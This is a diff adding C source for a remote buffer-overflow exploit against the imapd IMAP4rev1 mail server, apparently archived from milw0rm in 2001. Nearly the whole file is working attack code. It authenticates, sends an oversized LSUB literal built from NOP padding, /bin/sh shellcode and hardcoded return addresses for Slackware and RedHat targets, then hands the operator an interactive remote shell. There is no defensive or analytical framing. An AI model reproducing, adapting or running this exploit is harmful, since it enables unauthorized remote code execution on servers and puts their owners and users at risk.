@@ -1,0 +1,241 @@
+/* 
+ *			!!! Private !!!
+ *
+ *  imapd IMAP4rev1 v12.261, v12.264 and 2000.284 Remote Exploit. Others? Yes!
+ *
+ *  By: SkyLaZarT ( fcerqueira@bufferoverflow.org ) .aka. Felipe Cerqueira
+ *  Homepage: www.BufferOverflow.Org
+ *  Thankz: cync, oldm and Jans. ( BufferOverflow.org Team )
+ *		Antonio Marcelo and Felipe Saraiva
+ *
+ */
+
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <errno.h>
+#include <signal.h>
+
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netdb.h>
+#include <netinet/in.h>
+
+#define SIZE		1064
+#define NOP		0x90
+#define RET12261	0xbffff3ec
+#define RET12264	0xbffff4e0
+#define RET12264ZOOT	0xbffff697
+#define RET2000_284	0xbfffebc8
+
+#define INIT(x)	bzero(x, sizeof(x))
+#define READ(sock,x) read(sock, x, sizeof(x)) 
+
+
+#define TIMEOUT		20
+
+char shellcode[] =
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+int debug = 0;
+
+
+void openshell(int sock, int check);
+void processSignal(int signum);
+
+void processSignal(int signum) {
+	fprintf(stderr, "Time out!!\n");
+	exit(-1);
+}
+
+
+void openshell(int sock, int check) {
+	char buffer[1024];
+	fd_set rset;
+	int i;
+	
+	while(1) {
+		FD_ZERO(&rset);
+		FD_SET(sock, &rset);
+		FD_SET(fileno(stdin), &rset);
+
+		select(sock + 1, &rset, NULL, NULL, NULL);
+
+		if (FD_ISSET(sock, &rset)) {
+			if ((i = read(sock, buffer, sizeof(buffer))) <= 0) {
+				fprintf(stderr, "Connection terminated!\n");
+				close(sock);
+				exit(-1);
+			} else {
+				buffer[i] = 0x00;
+				if(check) {
+					if (!(strstr(buffer, "uid"))) {
+						fprintf(stderr, "Exploit failed\n");
+						exit(-1);
+					} else {
+						fprintf(stderr, "Exploit Success!!\n");
+						check = 0;
+					} 
+				}
+
+				puts(buffer);
+			}
+		}
+
+		if (FD_ISSET(fileno(stdin), &rset)) {
+			if ( check ) write(sock, "id\n", 3);
+				
+			if ((i = read(fileno(stdin), buffer, 
+					sizeof(buffer))) > 0) {
+				buffer[i] = 0x00;
+				write(sock, buffer, i);
+			}
+		}
+	}
+}
+				
+				
+int main(int argc, char **argv) {
+	char buffer[SIZE], sockbuffer[2048];
+	char *login, *password;
+	long retaddr; 
+	struct sockaddr_in sin;
+	struct hostent *hePtr;
+	int sock, i;	
+
+	fprintf(stderr, "\nRemote exploit for IMAP4rev1 v12.261, v12.264 and 2000.284\n"
+		"Developed by SkyLaZarT - www.BufferOverflow.org\n\n");
+
+	if ( argc < 5 ) {
+		fprintf(stderr, "%s <host> <login> <password> <type> [offset]\n", argv[0]);
+		fprintf(stderr, "\ttype: [0]\tSlackware 7.0 with IMAP4rev1 v12.261\n"
+				"\ttype: [1]\tSlackware 7.1 with IMAP4rev1 v12.264\n"
+				"\ttype: [2]\tRedHat 6.2 ZooT with IMAP4rev1 v12.264\n"
+				"\ttype: [3]\tSlackware 7.0 with IMAP4rev1 2000.284\n\n");
+
+
+		exit(-1);
+	}
+
+	login = argv[2];
+	password = argv[3];
+
+	switch(atoi(argv[4])) {
+		case 0: retaddr = RET12261; break;
+		case 1: retaddr = RET12264; break;
+		case 2: retaddr = RET12264ZOOT; break;
+		case 3: retaddr = RET2000_284; break;
+		default: 
+			fprintf(stderr, "invalid type.. assuming default " 
+				"type 0\n");
+			retaddr = RET12261; break;
+			
+	}
+
+	if ( argc == 6 ) 
+		retaddr += atoi(argv[5]);
+
+	signal(SIGALRM, processSignal);	
+
+	fprintf(stderr, "Trying to exploit %s...\n", argv[1]);
+
+	fprintf(stderr, "Using return address 0x%08lx. Shellcode size: %i bytes\n\n", retaddr, strlen(shellcode));
+
+
+	alarm(TIMEOUT);
+	hePtr = gethostbyname(argv[1]);
+	if (!hePtr) {
+		fprintf(stderr, "Unknow hostname : %s\n", strerror(errno));
+		exit(-1);
+	}
+	alarm(0);
+
+	sock = socket(AF_INET, SOCK_STREAM, 0);
+	if ( sock < 0 ) {
+		perror("socket()");
+		exit(-1);
+	}
+
+	sin.sin_family = AF_INET;
+	sin.sin_port = htons(143);
+	memcpy(&sin.sin_addr, hePtr->h_addr, hePtr->h_length);
+	bzero(&(sin.sin_zero), 8);
+
+	fprintf(stderr, "Connecting... "); 
+	alarm(TIMEOUT);
+	if ( connect(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0 ) {
+		fprintf(stderr, "failed to %s:143\n", argv[1]);
+		exit(-1);
+	}
+	alarm(0);	
+	
+	fprintf(stderr, "OK\n");
+
+	
+        for ( i = 0; i <= SIZE; i += 4 )
+                *(long *)&buffer[i] = retaddr;
+
+        for ( i = 0; i < ( SIZE - strlen(shellcode) - 100); i++ )
+                *(buffer+i) = NOP;
+
+        memcpy(buffer + i, shellcode, strlen(shellcode));
+
+	INIT(sockbuffer);
+	READ(sock, sockbuffer);
+
+	if(debug) fprintf(stderr, "debug %s", sockbuffer);	
+
+	fprintf(stderr, "Trying to loging ... ");
+
+	sprintf(sockbuffer, "1 LOGIN %s %s\n", login, password);
+	write(sock, sockbuffer, strlen(sockbuffer));
+	
+	INIT(sockbuffer);
+	READ(sock, sockbuffer);
+
+	if(debug) fprintf(stderr, "debug %s", sockbuffer);
+	
+	if (!(strstr(sockbuffer, "OK LOGIN completed"))) {
+		fprintf(stderr, "Login failed!!\n");
+		close(sock);
+		exit(-1);
+	}
+
+	fprintf(stderr, "OK\n");
+	
+	INIT(sockbuffer);
+	sprintf(sockbuffer, "1 LSUB \"\" {1064}\r\n");
+	write(sock, sockbuffer, strlen(sockbuffer));
+
+        INIT(sockbuffer);
+        READ(sock, sockbuffer);
+
+	if(debug) fprintf(stderr, "debug %s", sockbuffer);
+	
+	if(!(strstr(sockbuffer, "Ready"))) {
+		fprintf(stderr, "LSUB command failed\n");
+		close(sock);
+		exit(-1);
+	}	
+
+	fprintf(stderr, "Sending shellcode... ");	
+	
+	write(sock, buffer, 1064);
+	write(sock, "\r\n", 2);
+
+	fprintf(stderr, "OK\n");
+	
+	fprintf(stderr, "PRESS ENTER for exploit status!!\n\n");	
+
+	openshell(sock, 1);	
+							
+	close(sock);
+
+	return 0;
+}
+
+// milw0rm.com [2001-03-03]
